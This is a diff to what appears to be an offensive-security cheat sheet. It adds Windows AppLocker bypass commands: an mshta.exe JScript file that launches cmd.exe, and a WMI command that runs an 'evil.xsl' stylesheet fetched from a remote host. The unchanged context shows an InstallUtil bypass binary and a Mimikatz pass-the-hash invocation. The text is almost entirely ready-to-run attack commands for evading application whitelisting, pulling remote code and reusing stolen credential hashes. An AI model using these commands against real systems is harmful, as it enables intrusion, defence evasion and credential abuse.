@@ -315,7 +315,20 @@ Includes web services (not just port 80)
   C:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\lowpriv\bypass.exe
   ```
   - Requires downloaded to disk, but you can do it from memory too
-- Use `mshta.exe` to execute jscript and bypass Applocker
+- Use `mshta.exe` to execute jscript and bypass Applocker:
+  ```
+  C:\> type evil.js
+  <html><head>
+  <script language="JScript">
+  var shell = new ActiveXObject("WScript.Shell"); var res = shell.Run("cmd.exe");
+  </script>
+  </head><body><script language="JScript">self.close();</script></body></html>
+  C:\> mshta evil.js
+  ```
+- XSL -- use WMI to run an XSL file with cmds:
+  ```
+  wmi process get brief /format:"http://10.11.1.11/evil.xsl"
+  ```
 
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
